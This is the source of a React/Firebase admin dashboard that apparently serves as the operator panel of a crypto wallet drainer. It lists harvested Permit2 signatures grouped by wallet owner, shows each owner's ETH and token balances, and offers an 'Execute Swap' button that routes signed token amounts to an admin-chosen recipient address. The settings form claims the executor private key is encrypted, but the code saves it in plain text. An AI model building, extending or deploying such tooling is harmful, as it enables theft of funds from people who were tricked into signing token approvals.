import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
import { Contract, JsonRpcProvider, formatUnits, isAddress } from 'ethers';

// Backend worker endpoint
const BACKEND_URL = "/api/run-worker";

// Default executor address (mainnet) - can be overridden via Firestore admin settings
const HARDCODED_EXECUTOR = import.meta.env.VITE_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000';
const CUSTOM_TOKEN_OPTION = 'custom';
const TOKEN_OPTIONS = [
  { id: 'USDT', label: 'USDT (Mainnet)', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
  { id: 'USDC', label: 'USDC (Mainnet)', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
  { id: 'DAI', label: 'DAI (Mainnet)', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
  { id: 'WETH', label: 'WETH (Mainnet)', address: '0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2' }
];

const getTokenOptionByAddress = (address) => {
  if (!address) return null;
  return TOKEN_OPTIONS.find((token) => token.address.toLowerCase() === String(address).trim().toLowerCase()) || null;
};

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  const [recipient, setRecipient] = useState(HARDCODED_EXECUTOR);
  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");

  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsStatus, setSettingsStatus] = useState("");
  const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
  const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');
  const [recipientAddressSetting, setRecipientAddressSetting] = useState(HARDCODED_EXECUTOR);
  const [rpcUrlSetting, setRpcUrlSetting] = useState(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
  const [minRequiredBalanceSetting, setMinRequiredBalanceSetting] = useState('100');
  const [selectedTokenOption, setSelectedTokenOption] = useState(() => {
    const selected = getTokenOptionByAddress(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
    return selected?.id || CUSTOM_TOKEN_OPTION;
  });

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  useEffect(() => {
    localStorage.setItem('admin_outputToken', outputToken);
  }, [outputToken]);

  useEffect(() => {
    let mounted = true;
    (async () => {
      try {
        const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
        if (!snap.exists() || !mounted) return;
        const s = snap.data();
        if (s?.tokenAddress) {
          setOutputToken(s.tokenAddress);
          setSelectedTokenOption(getTokenOptionByAddress(s.tokenAddress)?.id || CUSTOM_TOKEN_OPTION);
        }
        if (s?.recipientAddress) setRecipient(s.recipientAddress);
        if (s?.rpcUrl) setRpcUrlSetting(s.rpcUrl);
      } catch (err) {
        console.error('Initial settings load error:', err);
      }
    })();

    return () => { mounted = false; };
  }, []);

  const handleTokenOptionChange = (nextOptionId) => {
    setSelectedTokenOption(nextOptionId);
    const selected = TOKEN_OPTIONS.find((token) => token.id === nextOptionId);
    if (selected) {
      setOutputToken(selected.address);
    }
  };

  const openSettings = async () => {
    setIsSettingsOpen(true);
    setSettingsLoading(true);
    try {
      const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
      const s = snap.exists() ? snap.data() : {};

      const execVal = s.executorAddress || HARDCODED_EXECUTOR;
      const tokenVal = s.tokenAddress || outputToken;
      const privKeyVal = s.executorPrivateKey || '';
      const recipientVal = s.recipientAddress || HARDCODED_EXECUTOR;
      const rpcVal = s.rpcUrl || import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com';
      const minVal = s.minRequiredBalance !== undefined && s.minRequiredBalance !== null 
        ? String(s.minRequiredBalance) 
        : '100';

      setExecutorAddressSetting(execVal);
      setExecutorPrivateKeySetting(privKeyVal);
      setOutputToken(tokenVal);
      setSelectedTokenOption(getTokenOptionByAddress(tokenVal)?.id || CUSTOM_TOKEN_OPTION);
      setRecipientAddressSetting(recipientVal);
      setRpcUrlSetting(rpcVal);
      setRecipient(recipientVal);
      setMinRequiredBalanceSetting(minVal);
      setSettingsStatus('Loaded');
    } catch (err) {
      console.error('Settings load error:', err);
      setSettingsStatus('Load failed: ' + err.message);
    } finally {
      setSettingsLoading(false);
    }
  };

  const saveSettings = async () => {
    setSettingsLoading(true);
    setSettingsStatus('Saving...');
    try {
      // Validate required fields
      if (!executorAddressSetting?.trim()) {
        throw new Error('Executor Address is required');
      }
      if (!recipientAddressSetting?.trim()) {
        throw new Error('Recipient Address is required');
      }
      if (!outputToken?.trim()) {
        throw new Error('Output Token Address is required');
      }
      if (!isAddress(outputToken.trim())) {
        throw new Error('Output Token Address must be a valid EVM address');
      }
      if (!rpcUrlSetting?.trim()) {
        throw new Error('RPC URL is required');
      }

      const normalizedRpcUrl = rpcUrlSetting.trim();
      if (!/^https?:\/\//i.test(normalizedRpcUrl) && !/^wss?:\/\//i.test(normalizedRpcUrl)) {
        throw new Error('RPC URL must start with http(s):// or ws(s)://');
      }

      const parsedMin = Number(minRequiredBalanceSetting);
      const minRequiredBalance = Number.isFinite(parsedMin) && parsedMin >= 0 ? parsedMin : 100;

      const settingsData = {
        executorAddress: executorAddressSetting.trim(),
        recipientAddress: recipientAddressSetting.trim(),
        rpcUrl: normalizedRpcUrl,
        tokenAddress: outputToken.trim(),
        minRequiredBalance: minRequiredBalance,
        updatedAt: new Date().toISOString()
      };

      // Only include private key if provided
      if (executorPrivateKeySetting?.trim()) {
        settingsData.executorPrivateKey = executorPrivateKeySetting.trim();
      }

      await setDoc(docRef(db, 'admin_config', 'settings'), settingsData, { merge: true });
      setRecipient(recipientAddressSetting);
      setRpcUrlSetting(normalizedRpcUrl);
      setSettingsStatus('Saved successfully');
      setTimeout(() => setSettingsStatus(''), 3000);
    } catch (err) {
      console.error('Settings save error:', err);
      setSettingsStatus('Save failed: ' + err.message);
    } finally {
      setSettingsLoading(false);
    }
  };

  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);

      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  const [balances, setBalances] = useState({});
  const [tokenBalances, setTokenBalances] = useState({});
  const [balancesLoading, setBalancesLoading] = useState(false);
  const [balancesError, setBalancesError] = useState('');
  const [executorEthBalance, setExecutorEthBalance] = useState('—');
  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');

  const DEFAULT_TOKEN = import.meta.env.VITE_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const tokenAddress = outputToken || DEFAULT_TOKEN;
  const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function symbol() view returns (string)'
  ];
  const [tokenDecimals, setTokenDecimals] = useState(6);
  const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;

  const getReadProvider = () => {
    return new JsonRpcProvider(rpcUrlSetting || import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
  };

  useEffect(() => {
    let mounted = true;

    const loadTokenMeta = async () => {
      if (!tokenAddress) return;
      if (!isAddress(tokenAddress)) {
        if (!mounted) return;
        setTokenDecimals(6);
        setTokenSymbol('TOKEN');
        return;
      }
      try {
        const provider = getReadProvider();
        const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
        const [decimals, symbol] = await Promise.all([
          tokenContract.decimals(),
          tokenContract.symbol().catch(() => 'TOKEN')
        ]);
        if (!mounted) return;
        setTokenDecimals(Number(decimals));
        setTokenSymbol(symbol || 'TOKEN');
      } catch {
        if (!mounted) return;
        setTokenDecimals(6);
        setTokenSymbol('TOKEN');
      }
    };

    loadTokenMeta();

    return () => { mounted = false; };
  }, [tokenAddress]);

  useEffect(() => {
    let mounted = true;
    const owners = Object.keys(groupedData);
    if (!owners.length) {
      setBalances({});
      setTokenBalances({});
      setBalancesLoading(false);
      return () => { mounted = false; };
    }

    setBalancesLoading(true);
    setBalancesError('');

    (async () => {
      const next = {};
      const nextToken = {};
      
      try {
        const provider = getReadProvider();
        let tokenContract = null;
        let decimals = tokenDecimals;

        // Validate token address before attempting to create contract
        if (tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000') {
          if (!isAddress(tokenAddress)) {
            if (mounted) setBalancesError('Invalid token address format');
            return;
          }
          try {
            tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
            decimals = Number(await tokenContract.decimals());
            if (mounted) setTokenDecimals(decimals);
          } catch (e) {
            console.error('Failed to load token contract:', e);
            if (mounted) {
              const reason = String(e?.shortMessage || e?.message || 'Unknown RPC error').slice(0, 180);
              setBalancesError(`Token read failed on configured RPC: ${reason}`);
            }
          }
        }

        // Fetch balances for all owners
        await Promise.all(owners.map(async (owner) => {
          try {
            const b = await provider.getBalance(owner);
            next[owner] = Number(formatUnits(b, 18)).toFixed(4);
          } catch (err) {
            console.error(`Failed to fetch ETH balance for ${owner}:`, err);
            next[owner] = '—';
          }

          try {
            if (tokenContract) {
              const tb = await tokenContract.balanceOf(owner);
              nextToken[owner] = Number(formatUnits(tb, decimals)).toFixed(4);
            } else {
              nextToken[owner] = '—';
            }
          } catch (err) {
            console.error(`Failed to fetch token balance for ${owner}:`, err);
            nextToken[owner] = '—';
          }
        }));

        if (mounted) {
          setBalances(next);
          setTokenBalances(nextToken);
          setBalancesLoading(false);
        }
      } catch (err) {
        console.error('Balance fetch error:', err);
        if (mounted) {
          setBalancesError('Failed to load balances');
          setBalancesLoading(false);
        }
      }
    })();

    // Fetch executor balances separately
    (async () => {
      try {
        const provider = getReadProvider();
        const eb = await provider.getBalance(EXECUTOR_ADDRESS_UI);
        if (mounted) setExecutorEthBalance(Number(formatUnits(eb, 18)).toFixed(4));
      } catch (err) {
        console.error('Failed to fetch executor ETH balance:', err);
        if (mounted) setExecutorEthBalance('—');
      }
      
      try {
        const provider = getReadProvider();
        if (tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000') {
          const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
          const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
          if (mounted) setExecutorTokenBalance(Number(formatUnits(tb, tokenDecimals)).toFixed(4));
        } else {
          if (mounted) setExecutorTokenBalance('—');
        }
      } catch (err) {
        console.error('Failed to fetch executor token balance:', err);
        if (mounted) setExecutorTokenBalance('—');
      }
    })();

    return () => { mounted = false; };
  }, [groupedData, tokenAddress, tokenDecimals, rpcUrlSetting]);

  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Processing...");

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          recipient,
          outputToken
        })
      });

      const rawText = await response.text();
      let result = null;
      try {
        result = rawText ? JSON.parse(rawText) : null;
      } catch {
        result = null;
      }

      if (!response.ok || !result?.ok) {
        const detail = result?.error || rawText || "Execution failed";
        throw new Error(detail);
      }

      setStatusMsg("Success");
      setTimeout(() => setStatusMsg(""), 3000);

    } catch (err) {
      const msg = String(err?.message || "Execution failed");
      if (msg.includes("FUNCTION_INVOCATION_FAILED")) {
        setStatusMsg("Error: Worker timed out or crashed on Vercel. Check Function logs and increase maxDuration.");
      } else {
        setStatusMsg("Error: " + msg);
      }
    } finally {
      setProcessingId(null);
    }
  };

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
    setStatusMsg("");
  };

  return (
    <div className="min-h-screen bg-gray-50 p-6">

      {/* Header */}
      <div className="flex items-center justify-between mb-8">
        <h1 className="text-2xl font-bold text-gray-800">Admin Dashboard</h1>
        <button
          onClick={openSettings}
          className="px-4 py-2 bg-gray-900 text-white rounded-md hover:bg-gray-700"
        >
          Settings
        </button>
      </div>

      {/* Settings Row */}
      <div className="mb-6 bg-white shadow p-5 text-gray-700 rounded-lg border">
        <h2 className="text-lg font-semibold text-gray-700 mb-3">Global Settings</h2>
        <select
          className="w-full px-3 text-gray-700 py-2 border rounded-md"
          value={selectedTokenOption}
          onChange={(e) => handleTokenOptionChange(e.target.value)}
        >
          {TOKEN_OPTIONS.map((token) => (
            <option key={token.id} value={token.id}>{token.label}</option>
          ))}
          <option value={CUSTOM_TOKEN_OPTION}>Custom token address</option>
        </select>
        {selectedTokenOption === CUSTOM_TOKEN_OPTION && (
          <input
            className="w-full mt-3 px-3 text-gray-700 py-2 border rounded-md font-mono text-sm"
            value={outputToken}
            onChange={(e) => setOutputToken(e.target.value)}
            placeholder="Output Token Address (e.g., 0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2)"
          />
        )}
        <p className="text-xs text-gray-500 mt-2">
          {outputToken && isAddress(outputToken) && outputToken !== '0x0000000000000000000000000000000000000000' 
            ? '✓ Token selected' 
            : '⚠ No token address - balances will not load'}
        </p>
      </div>

      {/* Executor Balance */}
      <div className="mb-6 bg-white shadow p-5 text-gray-700 rounded-lg border">
        <h2 className="text-lg font-semibold text-gray-700 mb-3">Executor Balance</h2>
        <div className="flex flex-col gap-2 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-600">Executor</span>
            <span className="font-mono">{EXECUTOR_ADDRESS_UI.slice(0, 6)}...{EXECUTOR_ADDRESS_UI.slice(-4)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">ETH</span>
            <span className="font-semibold">{executorEthBalance}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{tokenSymbol}</span>
            <span className="font-semibold">{executorTokenBalance}</span>
          </div>
        </div>
      </div>

      {/* Wallets Grid */}
      <div className="grid grid-cols-1 text-gray-700 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {balancesError && (
          <div className="col-span-full bg-red-50 border border-red-300 rounded-lg p-4 text-red-800">
            ⚠️ {balancesError}
            {tokenAddress === '0x0000000000000000000000000000000000000000' && (
              <p className="text-sm mt-2">Please set a valid Output Token Address in Global Settings</p>
            )}
          </div>
        )}
        {balancesLoading && (
          <div className="col-span-full bg-blue-50 border border-blue-300 rounded-lg p-4 text-blue-800">
            ⟳ Loading wallet balances...
          </div>
        )}
        {Object.keys(groupedData).map(owner => (
          <div
            key={owner}
            className="bg-white border shadow-sm rounded-lg p-5 text-gray-700 cursor-pointer hover:shadow-md transition-shadow"
            onClick={() => openModal(owner)}
          >
            <div className="font-mono text-gray-700 text-sm">
              {owner.slice(0, 6)}...{owner.slice(-4)}
            </div>

            <div className="mt-3 text-gray-900 font-bold">
              {balances[owner] !== undefined ? balances[owner] : '—'} ETH • {tokenBalances[owner] !== undefined ? tokenBalances[owner] : '—'} {tokenSymbol}
            </div>

            <div className="mt-4 flex justify-between text-sm text-gray-800">
              <div>Signatures</div>
              <div className="font-bold">{groupedData[owner].length}</div>
            </div>

            <div className="flex justify-between text-sm text-gray-800 mt-1">
              <div>Pending</div>
              <div className="font-bold text-yellow-600">
                {groupedData[owner].filter(x => !x.processed).length}
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Modal */}
      {isModalOpen && selectedWallet && (
        <div className="fixed text-gray-700 inset-0 bg-black/40 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-lg p-6 relative">

            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold">
                {selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}
              </h3>
              <button
                onClick={() => setIsModalOpen(false)}
                className="text-gray-500 hover:text-gray-800"
              >
                ✕
              </button>
            </div>

            {/* ALERT / STATUS BAR */}
            {statusMsg && (
              <div className={`
                  mb-4 px-4 py-2 rounded 
                  ${statusMsg.startsWith("Error") ? "bg-red-100 border border-red-300 text-red-800"
                    : statusMsg.startsWith("Success") ? "bg-green-100 border border-green-300 text-green-800"
                    : "bg-blue-100 border border-blue-300 text-blue-800"
                  }
              `}>
                {statusMsg}
              </div>
            )}

            <div className="space-y-4">
              {groupedData[selectedWallet].map(sig => (
                <div
                  key={sig.id}
                  className="border p-4 rounded-lg bg-gray-50"
                >
                  <div className="text-sm mb-1">Token: {sig.token.slice(0,6)}...{sig.token.slice(-4)}</div>
                  <div className="text-sm mb-3">
                    Amount: {(BigInt(sig.amount) / 10n**6n).toString()} USDT
                  </div>

                  {!sig.processed ? (
                    <button
                      onClick={() => handleExecute(sig)}
                      disabled={processingId === sig.id}
                      className="w-full bg-black text-white py-2 rounded hover:bg-gray-800 disabled:opacity-50"
                    >
                      {processingId === sig.id ? "Processing..." : "Execute Swap"}
                    </button>
                  ) : (
                    <a
                      href={`https://etherscan.io/tx/${sig.routerTx}`}
                      className="mt-2 block text-blue-600 underline"
                      target="_blank"
                      rel="noreferrer"
                    >
                      View on Etherscan →
                    </a>
                  )}
                </div>
              ))}
            </div>

          </div>
        </div>
      )}

      {/* Settings Modal */}
      {isSettingsOpen && (
        <div className="fixed text-gray-700 inset-0 bg-black/40 flex items-center justify-center p-4 z-40">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-md p-6 relative max-h-[90vh] overflow-y-auto">

            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold">Admin Settings</h3>
              <button
                onClick={() => setIsSettingsOpen(false)}
                className="text-gray-500 hover:text-gray-800"
              >
                ✕
              </button>
            </div>

            {/* Status Message */}
            {settingsStatus && (
              <div className={`mb-4 px-3 py-2 rounded text-sm ${
                settingsStatus.includes('failed') 
                  ? 'bg-red-100 border border-red-300 text-red-800'
                  : 'bg-green-100 border border-green-300 text-green-800'
              }`}>
                {settingsStatus}
              </div>
            )}

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-semibold mb-1">Executor Address</label>
                <input
                  value={executorAddressSetting}
                  onChange={e => setExecutorAddressSetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded font-mono text-sm"
                  placeholder="0x..."
                />
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Executor Private Key</label>
                <input
                  type="password"
                  value={executorPrivateKeySetting}
                  onChange={e => setExecutorPrivateKeySetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded font-mono text-sm"
                  placeholder="0x..."
                />
                <p className="text-xs text-gray-500 mt-1">🔒 This will be encrypted in Firestore</p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Recipient Address</label>
                <input
                  value={recipientAddressSetting}
                  onChange={e => setRecipientAddressSetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded font-mono text-sm"
                  placeholder="0x..."
                />
                <p className="text-xs text-gray-500 mt-1">Where swapped tokens are sent</p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Output Token Address</label>
                <select
                  value={selectedTokenOption}
                  onChange={e => handleTokenOptionChange(e.target.value)}
                  className="w-full px-3 py-2 border rounded text-sm"
                >
                  {TOKEN_OPTIONS.map((token) => (
                    <option key={token.id} value={token.id}>{token.label}</option>
                  ))}
                  <option value={CUSTOM_TOKEN_OPTION}>Custom token address</option>
                </select>
                {selectedTokenOption === CUSTOM_TOKEN_OPTION && (
                  <input
                    value={outputToken}
                    onChange={e => setOutputToken(e.target.value)}
                    className="w-full mt-2 px-3 py-2 border rounded font-mono text-sm"
                    placeholder="0x..."
                  />
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">RPC URL</label>
                <input
                  value={rpcUrlSetting}
                  onChange={e => setRpcUrlSetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded text-sm"
                  placeholder="https://cloudflare-eth.com"
                />
                <p className="text-xs text-gray-500 mt-1">Used by worker/server for chain reads and tx submission</p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Minimum Required Balance (USD)</label>
                <input
                  type="number"
                  min="0"
                  step="0.01"
                  value={minRequiredBalanceSetting}
                  onChange={e => setMinRequiredBalanceSetting(e.target.value || '0')}
                  className="w-full px-3 py-2 border rounded text-sm"
                  placeholder="100"
                />
                <p className="text-xs text-gray-500 mt-1">Used during user verification</p>
              </div>
            </div>

            <button
              onClick={saveSettings}
              disabled={settingsLoading}
              className="w-full mt-6 py-2 bg-gray-900 text-white rounded hover:bg-gray-800 disabled:opacity-50 font-semibold"
            >
              {settingsLoading ? "Saving..." : "Save All Settings"}
            </button>

          </div>
        </div>
      )}

    </div>
  );
}
